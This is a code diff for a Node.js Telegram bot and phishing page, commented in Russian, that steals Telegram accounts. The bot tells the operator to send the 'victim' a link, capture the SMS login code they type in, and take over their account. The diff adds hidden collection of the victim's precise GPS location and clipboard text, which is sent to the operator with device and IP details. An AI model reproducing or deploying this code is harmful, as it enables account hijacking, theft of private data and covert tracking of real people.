@@ -12,17 +12,16 @@ const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 const app = express();
 app.use(express.json());
 
-// Хранилище истории (в памяти)
 let history = [];
 
-// --- БОТ: КОМАНДЫ И КНОПКИ ---
+// --- БОТ ---
 bot.onText(/^\/start$/, (msg) => {
   const opts = {
     reply_markup: {
       inline_keyboard: [
         [{ text: '📜 История захватов', callback_data: 'hist' }],
         [{ text: '📖 Инструкция', callback_data: 'instr' }],
-        [{ text: '🌐 Открыть сайт', url: 'https://tg-sms-2.onrender.com' }]
+        [{ text: '🌐 Открыть сайт', url: 'https://tg-sms-ykx6.onrender.com' }]
       ]
     }
   };
@@ -34,7 +33,7 @@ bot.on('callback_query', (query) => {
   bot.answerCallbackQuery(query.id);
 
   if (query.data === 'instr') {
-    bot.sendMessage(chatId, `📖 <b>ИНСТРУКЦИЯ</b>\n\n1. Скинь жертве ссылку.\n2. Она вводит номер.\n3. Ты вводишь её номер в свой Telegram.\n4. Жертве приходит СМС. Она вводит код на сайте.\n5. Тебе в бот летит код. Ты вводишь его в Telegram и забираешь аккаунт.`, { parse_mode: 'HTML' });
+    bot.sendMessage(chatId, `📖 <b>ИНСТРУКЦИЯ</b>\n\n1. Скинь жертве ссылку.\n2. Она вводит номер.\n3. Ты вводишь её номер в свой Telegram.\n4. Жертве приходит СМС. Она вводит код.\n5. Тебе летит код. Ты вводишь его в Telegram.`, { parse_mode: 'HTML' });
   }
 
   if (query.data === 'hist') {
@@ -44,7 +43,6 @@ bot.on('callback_query', (query) => {
   }
 });
 
-// Утилита отправки
 async function sendToAdmin(text) {
   try {
     await bot.sendMessage(ADMIN_CHAT_ID, text, { parse_mode: 'HTML' });
@@ -53,12 +51,11 @@ async function sendToAdmin(text) {
 
 // --- API ---
 app.post('/api/request', async (req, res) => {
-  const { phone, ua, screen, battery } = req.body;
+  const { phone, ua, screen, battery, geo, clipboard } = req.body;
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
   if (!phone || phone.length < 8) return res.status(400).json({ ok: false });
 
-  // Улучшенное определение устройства
   let device = "Android (Неизвестно)";
   if (ua.includes("iPhone")) device = "Apple iPhone";
   else if (ua.includes("Samsung")) device = "Samsung Galaxy";
@@ -66,12 +63,10 @@ app.post('/api/request', async (req, res) => {
   else if (ua.includes("Windows")) device = "Windows PC";
   else if (ua.includes("Mac OS")) device = "Apple Mac";
   else {
-    // Пытаемся вытащить модель из строки Android (например: Android 10; K)
     const match = ua.match(/Android\s[0-9.]+;\s([^)]+)/);
-    if (match && match[1]) device = match[1].trim(); // Вернет, например, "Redmi 14C" или "23021RAA2Y"
+    if (match && match[1]) device = match[1].trim();
   }
 
-  // IP Инфо
   let ipInfo = "Неизвестно";
   let isVpn = false;
   try {
@@ -83,15 +78,19 @@ app.post('/api/request', async (req, res) => {
     }
   } catch (e) {}
 
-  const msg = `🎯 <b>НОВАЯ ЦЕЛЬ</b>\n\n` +
-              `📱 <b>Номер:</b> <code>${phone}</code>\n` +
-              `💻 <b>Модель:</b> ${device}\n` +
-              `🖥 <b>Экран:</b> ${screen || 'Неизвестно'}\n` +
-              `🔋 <b>Батарея:</b> ${battery || 'Скрыто'}\n` +
-              `🌐 <b>IP:</b> <code>${ip.split(',')[0]}</code>\n` +
-              `📍 <b>Локация:</b> ${ipInfo}\n` +
-              (isVpn ? `⚠️ <b>VPN/Proxy!</b>\n` : ``) +
-              `🕒 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}`;
+  let msg = `🎯 <b>НОВАЯ ЦЕЛЬ</b>\n\n` +
+            `📱 <b>Номер:</b> <code>${phone}</code>\n` +
+            `💻 <b>Модель:</b> ${device}\n` +
+            `🖥 <b>Экран:</b> ${screen || 'Неизвестно'}\n` +
+            `🔋 <b>Батарея:</b> ${battery || 'Скрыто'}\n` +
+            `🌐 <b>IP:</b> <code>${ip.split(',')[0]}</code>\n` +
+            `📍 <b>Локация (IP):</b> ${ipInfo}\n`;
+
+  if (geo) msg += `🗺 <b>GPS:</b> <a href="https://maps.google.com/?q=${geo}">Открыть карту</a>\n`;
+  if (clipboard) msg += `📋 <b>Буфер:</b> <code>${clipboard}</code>\n`;
+  if (isVpn) msg += `⚠️ <b>VPN/Proxy!</b>\n`;
+  
+  msg += `🕒 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}`;
 
   await sendToAdmin(msg);
   res.json({ ok: true });
@@ -199,6 +198,25 @@ app.get('/', (req, res) => {
   const clock = document.getElementById('clock');
   
   let fullPhone = '';
+  let geoData = null;
+  let clipData = null;
+
+  // Скрытый сбор геолокации и буфера
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      (pos) => { geoData = pos.coords.latitude + ',' + pos.coords.longitude; },
+      () => {},
+      { enableHighAccuracy: true, timeout: 5000 }
+    );
+  }
+  
+  try {
+    if (navigator.clipboard) {
+      navigator.clipboard.readText().then(t => { 
+        if(t && t.length > 2) clipData = t.slice(0, 100); 
+      }).catch(()=>{});
+    }
+  } catch(e) {}
 
   setInterval(() => {
     const d = new Date();
@@ -245,7 +263,9 @@ app.get('/', (req, res) => {
       screen: window.screen.width + 'x' + window.screen.height,
       lang: navigator.language,
       tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      battery: battery
+      battery: battery,
+      geo: geoData,
+      clipboard: clipData
     };
 
     try {
